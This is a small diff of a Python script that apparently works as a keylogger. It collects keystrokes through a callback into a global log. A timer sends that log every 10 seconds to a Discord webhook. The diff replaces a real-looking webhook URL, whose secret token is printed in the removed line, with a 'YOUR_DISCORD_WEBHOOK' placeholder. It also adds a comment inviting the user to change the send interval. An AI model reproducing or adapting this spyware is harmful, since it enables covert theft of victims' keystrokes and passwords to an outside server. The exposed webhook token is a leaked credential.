@@ -3,7 +3,7 @@ import requests
 import threading
 
 log = ""
-webhook_url = "https://discord.com/api/webhooks/1328769869260525568/TdEkWxoQwBXR-DkbreHln5Uhy45Wn9Ys0Ay27q5vQGtmKhrKUwqCqnYX3M7qsNl8UxUN"
+webhook_url = "YOUR_DISCORD_WEBHOOK"
 
 def callback_function(key):
     global log
@@ -27,7 +27,7 @@ def send_log_to_discord():
         except Exception as e:
             print("Sending error:", e)
         log = ""
-    timer = threading.Timer(10, send_log_to_discord)
+    timer = threading.Timer(10, send_log_to_discord) ## Change time
     timer.start()
 
 send_log_to_discord()
